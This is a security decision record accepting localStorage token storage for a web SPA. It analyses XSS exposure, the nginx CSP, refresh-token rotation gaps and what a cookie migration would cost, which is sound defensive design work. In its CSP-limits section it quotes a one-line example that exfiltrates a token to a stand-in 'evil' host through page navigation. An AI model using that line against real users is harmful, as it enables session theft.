# Decision — SPA tokens stay in `localStorage`

**Date:** 2026-08-27 · **Status:** ACCEPTED for the first production release · **Owner:**
the copyright holder named in `NOTICE` (a project built on this base names its own) ·
**Review by:** 2027-02-27, or on a trigger below.

Replaces the standing S-01 entry in `docs/hardening-audit.md`, which said "documented, not
changed" and named nobody and no date. "Release" is the first production deployment cut
from the default branch; there is no version scheme (`SECURITY.md`).

Code is cited **by symbol, not by line**: the first draft's line numbers had already moved,
and so did `nginx.conf`'s when the project was split out as a base. `nginx.conf` is cited by
block instead, and its CSP is quoted verbatim — the quote is the point.

## What is stored

`src/api/client.ts` in the SPA repo (`getAccessToken`, `getRefreshToken`, `setTokens`,
`clearTokens`): two `localStorage` keys, `access_token` and `refresh_token`. Lifetimes are
**configuration, not constants** — `JWT_EXPIRY_VALUE` and `REFRESH_TOKEN_EXPIRY_DAYS`
(`core/config.py`), applied in `auth_controller::create_jwt_token`. The defaults this
acceptance is sized against are **1 hour** and **30 days** (`.env.example`).

## The actual risk, and its real size

An attacker who achieves script execution on the SPA origin can read both keys.
**What httpOnly cookies would not change:** that script can already issue authenticated
requests. It runs on the origin, `connect-src 'self'` permits `/api`, and a cookie would be
attached automatically. Every action the account can take — reading every user's profile,
creating accounts, changing roles and permissions — is available in both designs.

**What it does change** is what leaves the machine: a *bearer credential* usable from
anywhere — their laptop, later, after the tab is closed — and `/user/refresh` is public by
design, so the refresh token alone suffices. With cookies the session is bound to that
browser. That is the delta: **a portable credential vs. a session that dies with the tab.**
Two things bound it, two widen it:

* Bounded: every access token is checked against a live `user_sessions` row on every request
  (`auth_middleware::assert_session_is_live`), so revocation is immediate;
  `logout_controller` deletes the row, and no stolen access token outlives its hour anyway.
* Bounded: `refresh_token_controller` rotates **in place**, overwriting both hashes on the
  same row, so an attacker who refreshes bounces the victim to the login screen.
* Widens it: **nothing acts on that signal.** There is no refresh-reuse detection, and
  logging back in calls `db.add(UserSession(...))` — a *new* row, revoking nothing. The
  victim sees one unexplained logout; the thief keeps the session it rotated into.
* Widens it: until the attacker refreshes, a stolen refresh token is good for up to 30 days
  from anywhere that can reach the API. This is the part worth caring about.

## The mitigations that are actually in place

`pmt-app/nginx.conf` serves the SPA origin alone — no TLS terminator, nothing in
front — so headers absent there are absent everywhere. The `server` block's
`Content-Security-Policy`, wrapped for width and otherwise unaltered:

```
default-src 'self'; script-src 'self' 'sha256-YqxCA7bptPAmpXZn0DKI4nGSQ9M6qjYQDZrUu2JZeWs=';
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com;
img-src 'self' data:; connect-src 'self'; worker-src 'self'; frame-ancestors 'none';
base-uri 'none'; form-action 'self'; object-src 'none'
```

Repeated verbatim in the `location ~ \.mjs$`, `location /assets/` and `location /` blocks:
nginx's `add_header` inheritance is replace-not-merge, and each of those locations sets
`Cache-Control`.

`script-src 'self'` plus **one** hash is what makes the acceptance defensible — the app has
exactly one inline script (the pre-paint theme block in `index.html`), no `unsafe-inline`,
no `unsafe-eval`, no third-party script host. `scripts/csp-hash.mjs`, wired as `postbuild` in
`package.json`, hashes the *built* `dist/index.html` and fails the build if `nginx.conf`
lacks it: a stale hash fails silently and surfaces as a flash of the wrong theme.

**A stolen database no longer yields tokens.** `user_sessions` holds only SHA-256 digests —
`access_token_hash CHAR(64)`, `refresh_token_hash` (`models/user_session.py`, revision
`20260821a001`) — closing SEC-5, which earlier drafts here listed as open. Narrow: it covers
the tokens at rest in the API's database, not the copy in the browser.
**Where the CSP does not reach:**

* It cannot stop exfiltration by top-level navigation (`location = 'https://evil/?t='+t`).
  No fetch directive covers navigation. `connect-src`, `img-src` and `form-action` close the
  quiet channels; the loud one stays open. CSP raises the cost; it does not prevent it.
* `csp-hash.mjs` checks only that the hash is *present somewhere* in `nginx.conf`. Nothing
  asserts `object-src 'none'`, `base-uri 'none'` or `frame-ancestors 'none'` are still
  there — deleting them keeps the build green.
* The origin's trust set is not empty: `style-src`/`font-src` already allow
  `fonts.googleapis.com` and `fonts.gstatic.com` (`index.html`). Not a script channel.
* **This document is gated, as of 2026-08-28.** It was not when it was written:
  `tests/unit/test_docs_references.py` scanned `SECURITY.md`, `README.md`, `CLAUDE.md`,
  `Dockerfile`, `Makefile` and `scripts/` — every place a design document is *cited from*
  except the directory where design documents actually live. Breaking a citation here to a
  section that does not exist left the suite green, which was checked rather than assumed.
  `SCANNED_GLOBS` now covers `docs/*.md`, so a pointer in this file to a rule nobody wrote
  fails a build. That matters here more than in most files: the first draft of this document
  shipped six wrong citations, and the review that caught them was a person reading, not a
  gate. The gate for what a citation *says* is still a person — see the note on the
  `PUBLIC` map in CLAUDE.md §10, which makes the same distinction about justifications that
  are present but untrue.

**The API sets its own CSP, and it is not this one.** `SecurityHeadersMiddleware`
(`core/middleware.py`) sends `API_CSP` — `default-src 'none'; frame-ancestors 'none';
base-uri 'none'; form-action 'none'` — on every response but `/docs`, `/redoc` and
`/openapi.json`, pinned by `tests/unit/test_security_headers.py`. It protects the API's own
origin (port 8000, published loopback-only in `docker-compose.yml`), and `localStorage` is
scoped to the SPA origin — so only `nginx.conf` is load-bearing here.

## What the alternative costs

httpOnly cookies are a design change to how the API authenticates, not a patch. Estimated
(not measured) at two to three days across both repositories, most of it CSRF and its tests:

* **API.** `login_controller` and `refresh_token_controller` return tokens in the
  `SuccessResponse` body and would set `Set-Cookie` instead — HTTP formatting inside a
  controller, which CLAUDE.md §2 puts in `routes/`, so the layering bends or `routes/auth.py`
  gains logic. `JWTAuthMiddleware` and `logout_controller` both parse `Authorization: Bearer`.
* **CSRF.** A new middleware in `core/middleware.py` plus a token channel, over **every
  state-changing route** — every operation that is not a GET. Cookies are attached whether
  or not the page meant to send them; that is why CSRF exists.
* **SameSite is coupled to TLS.** SPA and API are same-site in the shipped topology (nginx
  proxies `/api/`), so `Lax` works. But `VITE_API_BASE_URL` (`src/api/client.ts`) allows a
  separate origin, needing `SameSite=None; Secure`, needing TLS, which `nginx.conf` does not
  terminate (HSTS deliberately absent — the comment above the `server` block's headers). `allow_credentials=True` in
  `main.py` stops being vestigial (S-02); the CORS list becomes a boundary.
* **Tests.** `tests/fixtures.py::auth` is the shared `Bearer` helper; several further modules
  build the header themselves, including `tests/live/conftest.py`.
* **SPA.** `src/api/client.ts` (four token helpers, `credentials: 'include'`, a CSRF header),
  `src/features/auth/authSlice.ts`, `src/types/index.ts`'s `AuthTokens`, and every test written
  against `localStorage`: `src/api/client.test.ts`, `Login.test.tsx`, `src/test/msw/handlers.ts`,
  `e2e/support/mockApi.ts`, `e2e/{route-content,navigation}.spec.ts`.

## The decision

**Accepted for the first production release.** Accept rather than schedule, because the
delta only matters once the origin is plausibly injectable — and today it has one inline
script, no third-party script host, no `unsafe-inline`, and a build gate on the hash. The
CSRF budget would buy protection a strict `script-src` already makes expensive, while
Phase 1's identity work buys more per day.

Merging this file is the acceptance; declining it means replacing this section with a
schedule and a target release, not returning the entry to `SECURITY.md` unowned. The
mitigations above are the consideration: if one stops being true the acceptance is void and
this record is reopened, not amended. Cheaper than the cookie migration and not claimed as
done here: refresh-reuse detection — revoking a user's sessions when a rotated refresh token
is presented twice. It turns that signal into a control and needs no CSRF work.

## Review trigger

Any one of these reopens the decision before the review date:

1. **The first third-party script on the SPA origin** — analytics tag, widget, CDN
   `<script src>`. A second script host is a supply chain this acceptance never assessed.
2. **Any relaxation of `script-src`** — `unsafe-inline`, `unsafe-eval`, or a second hash for
   anything other than the theme block.
3. **Deployment across origins** — `VITE_API_BASE_URL` set to an absolute URL, changing both
   the CSP's reach and the SameSite answer.
4. **Any XSS finding in the SPA, fixed or not.** One reachable injection point turns this
   from theory into an incident with a 30-day credential in it.
5. **`REFRESH_TOKEN_EXPIRY_DAYS` raised above 30.** The window is the risk, and this
   acceptance was sized against the shipped default.
6. **A gate on the CSP directives.** If someone adds the check `csp-hash.mjs` does not do,
   trigger 2 becomes automatic; until then it is human and belongs here.
